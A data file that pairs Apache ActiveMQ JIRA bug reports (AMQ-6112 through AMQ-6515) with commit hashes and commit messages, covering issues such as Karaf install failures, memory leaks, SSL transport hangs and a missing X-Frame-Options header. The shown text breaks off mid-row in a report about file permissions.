",00129837dedd010843fe19150adfbfb64e97ced8,[AMQ-6515] Adding javax.inject bundle to fix the issue on feature install
13022457,AMQ-6515,"When just installing activemq-blueprint in a plain karaf 4.0.7 the following error happens. It seems that javax.inject is missing in the feature activemq-client.

karaf@root()> feature:repo-add activemq 5.15.0-SNAPSHOT
Adding feature url mvn:org.apache.activemq/activemq-karaf/5.15.0-SNAPSHOT/xml/features
karaf@root()> feature:install activemq-blueprint 
Error executing command: Unable to resolve root: missing requirement [root] osgi.identity; osgi.identity=activemq-blueprint; type=karaf.feature; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]""; filter:=""(&(osgi.identity=activemq-blueprint)(type=karaf.feature)(version>=5.15.0.SNAPSHOT)(version<=5.15.0.SNAPSHOT))"" [caused by: Unable to resolve activemq-blueprint/5.15.0.SNAPSHOT: missing requirement [activemq-blueprint/5.15.0.SNAPSHOT] osgi.identity; osgi.identity=activemq; type=karaf.feature; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]"" [caused by: Unable to resolve activemq/5.15.0.SNAPSHOT: missing requirement [activemq/5.15.0.SNAPSHOT] osgi.identity; osgi.identity=activemq-karaf; type=osgi.bundle; version=""[5.15.0.SNAPSHOT,5.15.0.SNAPSHOT]""; resolution:=mandatory [caused by: Unable to resolve activemq-karaf/5.15.0.SNAPSHOT: missing requirement [activemq-karaf/5.15.0.SNAPSHOT] osgi.wiring.package; filter:=""(osgi.wiring.package=org.apache.activemq.console)"" [caused by: Unable to resolve org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT: missing requirement [org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT] osgi.wiring.package; filter:=""(osgi.wiring.package=javax.inject)""]]]]
",e3d698b9d9c5cf97f5d462ee93f7027b97868da6,[AMQ-6515] add explicit no import for ..thirdparty.publicsuffix which leaks from guava via bnd into the activemq-osgi module
13022441,AMQ-6514,"User properties as a placeholder do not work in the blueprint activemq config.

<policyEntry topic="">"" optimizedDispatch=""true"" producerFlowControl=""false"" memoryLimit=""$example{perTopicMemoryLimit}"">


Java.lang.IllegalArgumentException: Could convert not to a memory size: $example
{perTopicMemoryLimit}
at org.apache.activemq.util.MemoryPropertyEditor.setAsText(MemoryPropertyEditor.java:63)[97:org.apache.activemq.activemq-osgi:5.10.0]

See http://apaste.info/nSw3h

This seems to be caused by an error in xbean-blueprint 3.x. Upgrading to 4.2 fixes the issue. I will create a PR for the change.",bee0904b843129992b9dcbc035aa08f970728750,[AMQ-6514] Adding test for activemq blueprint setup and xbean problem
13017249,AMQ-6494,During shutdown there are a number of BrokerStoppedException(s) thrown unnecessarily and unnecessary timeouts.,dca066287ebd7ffe465544f647e213e1c4d5744a,"https://issues.apache.org/jira/browse/AMQ-6494

Ignoring test that currently fails. The parent test is already ignored
in the build so I'm adding this one to be ignored as well.  It
currently fails on exceptions that are expected and needs to be fixed."
13014262,AMQ-6474,"Hello,

when undeploying a Spring (4) webapp (JDK 1.8.101), we got a memory leak error message on a thread.


AVERTISSEMENT: The web application [venus] appears to have started a thread named [ActiveMQ InactivityMonitor Worker] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread:
 sun.misc.Unsafe.park(Native Method)
 java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
 java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(Unknown Source)
 java.util.concurrent.SynchronousQueue$TransferStack.transfer(Unknown Source)
 java.util.concurrent.SynchronousQueue.poll(Unknown Source)
 java.util.concurrent.ThreadPoolExecutor.getTask(Unknown Source)
 java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
 java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
 java.lang.Thread.run(Unknown Source)
oct. 20, 2016 2:50:43 PM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads

when using an older version of active MQ 5.11.4 we don't get the error.

We notice the shutwon of factory thread pool is not made anymore ( 

inside class AbstractInactivityMonitor , method stopMonitorThreads 
this line has been removed: ThreadPoolUtils.shutdown(ASYNC_TASKS);

Could you fix it.

",d1f42bd01e90abe3fb171834efd46a3594ba2600,"https://issues.apache.org/jira/browse/AMQ-6474

ASYNC_TASKS executor not being shut down on stop with no other users in
service."
13013824,AMQ-6471,"in karaf - the activemq authorizationMap groupClass is specified to match the karaf login modules.
the runtime configuration plugin supports updates to that map but does not set the groupClass in error. The result is that all of entries are invalid after a modification.
A restart is required to rectify.",52ab6ba09b0f58ab95ea24c501fff12488decc4e,AMQ-6471 - map groupClass attribute on mod to authorization map. fix and test
13012399,AMQ-6465,"There is an issue with duplicate message suppression for durable subscriptions over a network bridge that is causing the memory usage counter to grow and never shrink.  The issue is that when the message is checked against the network bridge filter, a reference to the message is incremented (which increases the memory usage counter) but then that reference is never decremented so the memory usage doesn't decrease as it should.  The actual memory is freed but the counter continues to grow until it reaches the configured maximum at which point the broker can't do any work because it thinks the memory is full.",406a34294befca4ba2de4b728c86f64b96a94945,"https://issues.apache.org/jira/browse/AMQ-6465

Properly decrementing the message reference count in
DemandForwardingBridgeSupport when messages supression is checked for
durable subscriptions"
13012399,AMQ-6465,"There is an issue with duplicate message suppression for durable subscriptions over a network bridge that is causing the memory usage counter to grow and never shrink.  The issue is that when the message is checked against the network bridge filter, a reference to the message is incremented (which increases the memory usage counter) but then that reference is never decremented so the memory usage doesn't decrease as it should.  The actual memory is freed but the counter continues to grow until it reaches the configured maximum at which point the broker can't do any work because it thinks the memory is full.",c4a1346875dc40c1469e5b9625efe73eccb4b081,[AMQ-6465] fix up test interplay - clean on start and consume what is produced
13011304,AMQ-6463,"The response cannot be processed b/c there is no connection in the context provide by the scheduler plugin.
The reply is lost so there is no message loss in this case, just a worrying stack trace.

{code}
ERROR | Error in thread 'ActiveMQ BrokerService[ILP-B] Task-18534'
java.lang.NullPointerException
at org.apache.activemq.broker.region.Queue$4.run(Queue.java:688)[activemq-broker-5.14.0.jar:5.14.0]
at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1551)[activemq-broker-5.14.0.jar:5.14.0]
at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)[activemq-client-5.14.0.jar:5.14.0]
at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)[activemq-client-5.14.0.jar:5.14.0]
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)[:1.7.0_51]
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)[:1.7.0_51]
at java.lang.Thread.run(Thread.java:744)[:1.7.0_51]{code}",74a5381b9a79d2ee708345743bb128d06bd9d80b,AMQ-6463 - provide connection to scheduler context in case of deferred send or error
13010458,AMQ-6459,"Using  this JMX value for monitoring, an alarm can be set to some threshold.
However when remedial action is taken to reduce usage, the value stays high.",8493f6b4d79146509e554e2b640f486d79f40bbb,AMQ-6459 - store based % usage needs to poll the store for the current value on each access
13008311,AMQ-6444,"When a message is enlisted in a transaction by having an accepted disposition but is not settled, and the transaction is rolled back by the client, the broker should treat that message as still being acquired by the receiver and not redeliver it again and the receiver should be able to consume, modify, reject or release the delivery on its own afterwards.",a2995b7614a6e15af7958f78bd412ccab00589bb,"https://issues.apache.org/jira/browse/AMQ-6444

Fix failing tests"
13007166,AMQ-6441,"I've set up Active MQ in production with a shared file system master/slave configuration (KahaDB). I've set everything up and mounted the EFS on both EC2 instances. 

When I check the disk free stats I get 8 exabytes for the shared file system: 

{code}
$ df -h 
eu-west-1a.***.efs.eu-west-1.amazonaws.com:/  8.0E     0  8.0E   0% /mnt/efs 
{code}

Unfortunately, ActiveMQ cannot interpret this number (8 exabytes). This may be due to integer truncation.

Here is a snippet of the log:

{code}
Store limit is 102400 mb (current store usage is 0 mb). The data directory: /mnt/efs/kahadb only has -8796093022208 mb of usable space - resetting to maximum available disk space: -8796093022207 mb 
Store limit is -8796093022207 mb, whilst the max journal file size for the store is: 32 mb, the store will not accept any data when used. 
{code}",f225120f61c9acfbe64b5f7590fbd72bb668525f,Fixes AMQ-6441 where a negative value can be returned with large AWS EFS files systems when calling java.io.File.getTotalSpace()
13006679,AMQ-6438,"The JMS Message Transformer seem to have several areas where performance can be improved.  

Performance numbers on master before updates were made

{noformat}

[jms] Total time for 1000000 cycles of transforms = 14209 ms  -> [testComplexQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 4282 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 7363 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 4475 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 2468 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 1613 ms  -> [testBodyOnlyMessage[Transformer->jms]]
[native] Total time for 1000000 cycles of transforms = 13861 ms  -> [testComplexQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 5429 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 8523 ms  -> [testTypicalQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 4576 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 2577 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 646 ms  -> [testBodyOnlyMessage[Transformer->native]]
[raw] Total time for 1000000 cycles of transforms = 523 ms  -> [testComplexQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 215 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 474 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 468 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 274 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 436 ms  -> [testBodyOnlyMessage[Transformer->raw]]

{noformat}

After updates and fixes.

{noformat}

[jms] Total time for 1000000 cycles of transforms = 10593 ms  -> [testComplexQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 3571 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 6172 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 3725 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 2202 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 837 ms  -> [testBodyOnlyMessage[Transformer->jms]]
[native] Total time for 1000000 cycles of transforms = 13193 ms  -> [testComplexQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 5172 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 7711 ms  -> [testTypicalQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 4061 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 2327 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 371 ms  -> [testBodyOnlyMessage[Transformer->native]]
[raw] Total time for 1000000 cycles of transforms = 212 ms  -> [testComplexQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 19 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 210 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 231 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testBodyOnlyMessage[Transformer->raw]]

{noformat}",5702ec8d7ca330c94d6e4b59cea4606285b2c196,"https://issues.apache.org/jira/browse/AMQ-6438

Add additional test for larger more complex AMQP message"
13006679,AMQ-6438,"The JMS Message Transformer seem to have several areas where performance can be improved.  

Performance numbers on master before updates were made

{noformat}

[jms] Total time for 1000000 cycles of transforms = 14209 ms  -> [testComplexQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 4282 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 7363 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 4475 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 2468 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 1613 ms  -> [testBodyOnlyMessage[Transformer->jms]]
[native] Total time for 1000000 cycles of transforms = 13861 ms  -> [testComplexQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 5429 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 8523 ms  -> [testTypicalQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 4576 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 2577 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 646 ms  -> [testBodyOnlyMessage[Transformer->native]]
[raw] Total time for 1000000 cycles of transforms = 523 ms  -> [testComplexQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 215 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 474 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 468 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 274 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 436 ms  -> [testBodyOnlyMessage[Transformer->raw]]

{noformat}

After updates and fixes.

{noformat}

[jms] Total time for 1000000 cycles of transforms = 10593 ms  -> [testComplexQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 3571 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 6172 ms  -> [testTypicalQpidJMSMessage[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 3725 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 2202 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->jms]]
[jms] Total time for 1000000 cycles of transforms = 837 ms  -> [testBodyOnlyMessage[Transformer->jms]]
[native] Total time for 1000000 cycles of transforms = 13193 ms  -> [testComplexQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 5172 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 7711 ms  -> [testTypicalQpidJMSMessage[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 4061 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 2327 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->native]]
[native] Total time for 1000000 cycles of transforms = 371 ms  -> [testBodyOnlyMessage[Transformer->native]]
[raw] Total time for 1000000 cycles of transforms = 212 ms  -> [testComplexQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 19 ms  -> [testTypicalQpidJMSMessageOutBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 210 ms  -> [testTypicalQpidJMSMessage[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testMessageWithNoPropertiesOrAnnotations[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 231 ms  -> [testTypicalQpidJMSMessageInBoundOnly[Transformer->raw]]
[raw] Total time for 1000000 cycles of transforms = 205 ms  -> [testBodyOnlyMessage[Transformer->raw]]

{noformat}",b1a9a9382b837fb8cff7f9586c7f9516675bf78a,"https://issues.apache.org/jira/browse/AMQ-6438

Add a new test for encode / decode validation.  Fix issue where the
internal scheduled message properties were escaping into the outbound
message."
13003301,AMQ-6422,"Setting prefetch based on the credit can get in a knot if the credit is small and the dispositions are outstanding.
The prefetch gets set to 1, but with an inflight message, there is nothing dispatched b/c the sub looks full.",640289868e18e82b054be8aff5580d3665518f5c,"https://issues.apache.org/jira/browse/AMQ-6422

Add test for credit grants but no settles for a single receiver."
13003301,AMQ-6422,"Setting prefetch based on the credit can get in a knot if the credit is small and the dispositions are outstanding.
The prefetch gets set to 1, but with an inflight message, there is nothing dispatched b/c the sub looks full.",da9fedead4078cc82efb32e15d8d9cd53c8e82dc,"https://issues.apache.org/jira/browse/AMQ-6422

Adds a split consumer test that uses presettled receivers."
13002097,AMQ-6414,"The nio+ssl transports can hang on initial connection and never read from the socket after the SSL handshake for certain conditions.  This behavior is most evident when using the auto+nio+ssl transport for a network bridge between 2 brokers, however I also saw the issue for the normal nio+ssl transport when running the NetworkAsyncStartTest and even the amqp+nio+ssl transport.

After debugging I found that the issue is that the onSelect method of the registered callback, which calls the serviceRead() method, is not always getting triggered.  I believe that the root of the problem is that even though a selector is registered with a SelectionKey.OP_READ, there is no guarantee that the selected set is correct which is what the SelectorWorker uses to detect if the operation is ready. The SelectionKey documentation specifically states that the ready set is a hint but not a guarantee that the channel is ready.  This seems to only effect the SSL transport (not normal NIO), probably because a read selection was already done once to unwrap the SSL transport

More info: https://docs.oracle.com/javase/8/docs/api/java/nio/channels/SelectionKey.html

The fix for this is to trigger the selectRead() after the transport finishes starting up.  (needs to be in a new thread specifically for OpenWire to allow the wireformat negotiation to not block on startup).  This will work for the SSL transport specifically since we know the transport is read to read from the the channel after starting up.  We know this because the SSL handshake already took place which means we've already read from the channel.

",a1f6261fb248fd2d39b78e7f2245352009394975,[AMQ-6414] additional test that reproduces and validates
13002097,AMQ-6414,"The nio+ssl transports can hang on initial connection and never read from the socket after the SSL handshake for certain conditions.  This behavior is most evident when using the auto+nio+ssl transport for a network bridge between 2 brokers, however I also saw the issue for the normal nio+ssl transport when running the NetworkAsyncStartTest and even the amqp+nio+ssl transport.

After debugging I found that the issue is that the onSelect method of the registered callback, which calls the serviceRead() method, is not always getting triggered.  I believe that the root of the problem is that even though a selector is registered with a SelectionKey.OP_READ, there is no guarantee that the selected set is correct which is what the SelectorWorker uses to detect if the operation is ready. The SelectionKey documentation specifically states that the ready set is a hint but not a guarantee that the channel is ready.  This seems to only effect the SSL transport (not normal NIO), probably because a read selection was already done once to unwrap the SSL transport

More info: https://docs.oracle.com/javase/8/docs/api/java/nio/channels/SelectionKey.html

The fix for this is to trigger the selectRead() after the transport finishes starting up.  (needs to be in a new thread specifically for OpenWire to allow the wireformat negotiation to not block on startup).  This will work for the SSL transport specifically since we know the transport is read to read from the the channel after starting up.  We know this because the SSL handshake already took place which means we've already read from the channel.

",b6521e292b20788eef44f3a7810d8e4281b677dc,[AMQ-6414] additional logging that helped identify root cause
13002091,AMQ-6413,"failover replay or inflight sends are trapped by the producer audit that is backed by the persistence adapter audit.
The intent is to drop any resend that has made it into the store.
With concurrentStoreAndDispatch messages can skip the store but also can skip the audit.
A failover resend can get delivered to the store and replayed to the cursor. 
AMQ-6406 and the message will go the the DLQ or get dispatched if the cursor audit is disabled/exhausted.

Pre AMQ-6406 the message would not get dispatched till restart, holding up gc.",f8bc19b96da752e216de2c5c543a7d8523512a03,AMQ-6413 - ensure audit update on skipped store add for kahadb concurrentStoreAndDispatch. Fix and test
12999164,AMQ-6404,"The changes introduced by AMQ-6374 broke the transformation between AMQP and JMS for UTF-8 text messages.

I have enabled the JMS message transformer for the AMQP transport connector. If I send a UTF-8 text message over AMQP and then reads it back over AMQP I get an empty message body.

I have looked at the code and found the bad code. It is in the {{org.apache.activemq.transport.amqp.message.ActiveMQJMSVendor}} class.

When the inbound message arrives the {{createTextMessage(String)}} method is called. That method creates an {{ActiveMQTextMessage}} instance whose data is set with the {{setText}} method.

When the outbound message is to be sent the {{getBinaryFromMessageBody(TextMessage)}} method is called. This method tries to get the data with the {{getContent}} method, but that method always returns {{null}}. The {{getText}} method returns the correct data, but is not used here.
",1030fb184216d00e3fd43a416931acd3b2fc6794,"https://issues.apache.org/jira/browse/AMQ-6404

Add check for unmarshalled text body and handle that case."
12993626,AMQ-6381,When messages are forwarded to a remote broker from a networked durable subscription the forwards stat which keeps a count of the number of forwarded messages is never incremented.  It does work properly for topic subscriptions.,82295fd2c6dea96433d15e00e00d53c6d41f5c0b,"https://issues.apache.org/jira/browse/AMQ-6381

Fixing DurableTopicSubscription so that an ack will properly update the
forwards statistic on an ack"
12991247,AMQ-6370,"There is an read/write lock guarding the cleanup task and other jdbc ops in the jdbc message store.
Typically the read lock is obtained before the connection from the jdbc connection pool.
In the case of xa transactions, the connection is obtained before the read lock, in transactioncontext.begin, leaving a window between which readlock holders can be blocked pending the connection release.
If there is a cleanup (and write lock) request before release, the xa transaction cannot obtain a read lock and we are stuck.
Disabling the cleanup task avoids this issue, but that is only an option if there are no durable subs or if the durable sub cleanup task can be tackled through db admin.
",ad657cc202f30bc279316ed34c1e48c7291070cf,AMQ-6370 - ensure derby instance is created
12988297,AMQ-6350,"Blueprint:
{code}
<cm:property-placeholder persistent-id="".."" update-strategy=""reload"" />
<bean id=""pooledConnectionFactory"" class=""org.apache.activemq.jms.pool.PooledConnectionFactory""
        init-method=""start"" destroy-method=""stop"">
...
</bean>
{code}
or Java:
{code}
org.apache.activemq.jms.pool.PooledConnectionFactory pcf = new org.apache.activemq.jms.pool.PooledConnectionFactory();
pcf.start();
...
pcf.stop();
pcf.start();
// producer.send(textMsg);
{code}

Stacktrace:
{code}
Caused by: javax.jms.IllegalStateException: java.lang.IllegalStateException: Pool not open
	at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:159)
	at org.apache.activemq.jms.pool.PooledConnection.createSession(PooledConnection.java:167)
	at org.talend.ipaas.rt.amqsource.AMQEventSource.createJmsSession(AMQEventSource.java:282)
	at org.talend.ipaas.rt.amqsource.AMQEventSource.sendEvent(AMQEventSource.java:117)
	... 2 more
Caused by: java.lang.IllegalStateException: Pool not open
	at org.apache.commons.pool2.impl.BaseGenericObjectPool.assertOpen(BaseGenericObjectPool.java:672)
	at org.apache.commons.pool2.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:339)
	at org.apache.commons.pool2.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:279)
	at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:141)
	... 5 more
{code}",0706fd0bc1f499f1fc304ec1c70aa8aaa3dd4d69,"https://issues.apache.org/jira/browse/AMQ-6350

Allow for PooledConnectionFactory restart after being stopped."
12986605,AMQ-6345,"I am currently investigating the behavior of several MQTT brokers and noticed that the ActiveMQ broker responds to PINGREQ packets with PINGRESP packets even if no CONNECT packet has been sent before. 

This would be a violation of MQTT-3.1.0-1 and MQTT-4.8.0-1 of MQTT v3.1.1 while MQTT v3.1 is not that strict about this issue, but does also state ""When a TCP/IP socket connection is established from a client to a server, a protocol level session must be created using a CONNECT flow."" (http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html#connect)

Since ActiveMQ supports MQTT v3.1 according to http://activemq.apache.org/,
but also MQTT v3.1.1 according to Issue AMQ-4990, I am not sure whether this should actually be considered a bug. ",6dacef1c9552edbad656c31d784179c2cd179b2e,"https://issues.apache.org/jira/browse/AMQ-6345

The MQTT transport will now throw an exception if a PINGREQ is sent to
the broker if a CONNECT packet has not been received first as the spec
says CONNECT must be the first packet sent."
12986605,AMQ-6345,"I am currently investigating the behavior of several MQTT brokers and noticed that the ActiveMQ broker responds to PINGREQ packets with PINGRESP packets even if no CONNECT packet has been sent before. 

This would be a violation of MQTT-3.1.0-1 and MQTT-4.8.0-1 of MQTT v3.1.1 while MQTT v3.1 is not that strict about this issue, but does also state ""When a TCP/IP socket connection is established from a client to a server, a protocol level session must be created using a CONNECT flow."" (http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html#connect)

Since ActiveMQ supports MQTT v3.1 according to http://activemq.apache.org/,
but also MQTT v3.1.1 according to Issue AMQ-4990, I am not sure whether this should actually be considered a bug. ",667ea7c640dd0203b2ecdc83f74435e77cbe44ab,"https://issues.apache.org/jira/browse/AMQ-6345

disabling failed assertion for test as it is expected based on how this
test is usin the client"
12966403,AMQ-6286,"When a consumer prefetches messages or consumes and does not ack in pull mode, on close, any messages that have not been acked end up in on the broker in the already delivered list.
These messages get dispatched first. However, if these messages are unconsumed again, they get appended to the dispatched list.
This makes sense when there are multiple consumers, A gets 10, B gets 10, A closes, there are 10 to redeliver, B closes, there are now 20 to redeliver. the order should be preserved.
However if there is a single consumer this breaks.

Consider: 
publish 100 to Q
consume 50 and rollback/close with all unacked, expect 0-49
consume 10 and rollback/close with all unacked, expect 0-9
consume 10 more ... expect 0-9 but get 10-19!

In concert with the strictOrderDispatch policy, I think we should be able to support the natural expectation here.

The scenario presents its self with prefetched messages where the prefetch varies or more naturally with a single consumer that consumed in various transaction batches. In the transacted case, two failures would result in compromised queue ordering. 

",e02c1a17f83b21cbf42fa9e6e78a891af3edd8bb,"https://issues.apache.org/jira/browse/AMQ-6286

Create a follow on test showing AMQP respects order."
12951170,AMQ-6218,"I have 1 Virtual Topic and 40 Consumer to consume the messages sent by the topic. The problem is when I am sending thousands of Messages lets say 10000 via Virtual Topic I have noticed that 2 or 3 consumer are getting null as a text when I do message.getText(), but virtual topic is not sending a null as a text message if it so then all 40 consumer should report same.

I have also noticed this problem is not happening in AMQ v5.11 or with levelDB in AMQ v5.12.2/5.13.2. It is happening only in when you use kahaDB with AMQ v5.12.2/5.13.2
",ea09159a4087212964787e7cf68ef30170d115f0,"https://issues.apache.org/jira/browse/AMQ-6218

Fixing copy method of ActiveMQTextMessage to prevent a race condition
when concurrent store and dispatch is used with Queues

We may need explicity synchronization between the text and content fields
in the future if other issues pop up"
12949948,AMQ-6212,"Spring 4.0.x and above introduced a new jar file, spring-messaging, and these classes are a dependency on spring-jms.  This jar file should be included in the shaded activemq-all jar.",4bd9a4ef6f29399ebde61275db75cf8d5d323ffc,"https://issues.apache.org/jira/browse/AMQ-6212

Adding spring-messaging to the artifactSet for activemq-all to be
included inside the shaded jar"
12948571,AMQ-6206,"stomp messages are passed on from the protocol converter directly so their properties are not marshalled. Only marshalled properties are tracked for usage by Message.getSize
",57264bf8dc9970d7d808cf24216b6185ceb644e2,https://issues.apache.org/jira/browse/AMQ-6206 - ensure properties are marshalled before dispatch to broker so that their values are reflected in the memory usage
12933980,AMQ-6143,Please upgrade org.springframework to at least version 4.1.9 (preferably version 4.2.4) and org.apache.taglibs to version 1.2.3 or 1.2.5.,c6f470266e88b01db6286e72546dcf396919566a,"https://issues.apache.org/jira/browse/AMQ-6143

Updating to taglibs 1.2.3"
12933814,AMQ-6142,"In our environment we use an embedded broker. On one topic where compression is enabled, the server is also listening in on the messages. From ActiveMQ 5.10.0 up to 5.13.0, we encounter DataFormatException: incorrect header check exceptions on the tcp clients due to corruption of the payload. Attached are a test server and client. At some point, the client will exit due to mentioned exception. Increase chances by running multiple clients. This scenario works with 5.8.0 and 5.9.1.

If the server has multiple consumers on the same topic, they will encounter corruption as well, but this has other side-effects.",5f7a81f9280fb65b8a3c1f85c4570a18d87fafd9,"https://issues.apache.org/jira/browse/AMQ-6142

Fixing a race condition that exists in the decompress method of
ActiveMQBytesMessage that can cause an invalid length to be read."
12928331,AMQ-6113,The X-Frame-Options header is missing for the ActiveMQ Web Console and it should be added to all responses,186b5d0f305ed63b23a1db712a933aa4896006cf,"https://issues.apache.org/jira/browse/AMQ-6113

Properly set the X-FRAME-OPTIONS header on web responses."
12928282,AMQ-6112,"In 5.12.X :
- activemq.jar is 0644 and wrapper.jar is 0755

{noformat}
> ls -al apache-activemq-5.12.0/bin 
drwxrwxr-x  5 myuser myuser  4096 janv.  7 10:27 .
drwxr-xr-x 10 myuser myuser  4096 août  10 17:26 ..
-rwxr-xr-x  1 myuser myuser 21748 août  10 17:26 activemq
-rwxr-xr-x  1 myuser myuser  6189 août  10 17:26 activemq-diag
-rw-r--r--  1 myuser myuser 15958 août  10 17:21 activemq.jar
-rw-r--r--  1 myuser myuser  4881 août  10 17:26 env
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 linux-x86-32
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 linux-x86-64
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 macosx
-rwxr-xr-x  1 myuser myuser 83820 août  10 17:11 wrapper.jar
{noformat}

In 5.13.X :
- activemq.jar is 0600 and wrapper.jar is 0700

{noformat}
